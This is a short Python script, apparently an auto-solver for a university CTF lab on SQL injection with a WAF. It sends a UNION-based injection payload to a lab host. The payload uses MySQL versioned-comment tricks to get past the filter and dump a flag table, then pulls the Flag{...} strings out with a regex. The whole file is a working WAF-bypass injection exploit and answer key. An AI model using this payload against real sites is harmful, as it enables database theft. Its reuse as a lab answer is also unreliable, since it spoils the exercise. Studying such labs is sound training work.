import requests
import re
import http_vlue as hv
print("物智学院CTF平台")
print("课程：漏洞扫描与安全审计")
print("实验8_sqli-WAF")

# 目标URL
url = 'http://10.68.6.202'
port = input('请输入端口：')
endpoint = "/Less-1/?id=-1%27%20union%20/*!10440select*/%201,convert((/*!10440select*/%20group_concat(flag)%20from%20security.flag)using%20gbk),3--+"

if hv.get_qx():
    # 发送带有Payload的GET请求
    response = requests.get(f'{url}:{port}{endpoint}')

    # 使用正则表达式提取所有的flag
    flag_pattern = r'Flag\{([\w-]+)\}'
    flags = re.findall(flag_pattern, response.text)

    # 检查是否匹配到flag
    if flags:
        print("这些似乎是你的答案：")
        for flag in flags:
            print("Flag{" + flag + "}")
        input("请按回车键继续...")
    else:
        print("未找到Flag")
        input("请按回车键继续...")
else:
    print("失败，原因：权限不足！")
    input("请按回车键继续...")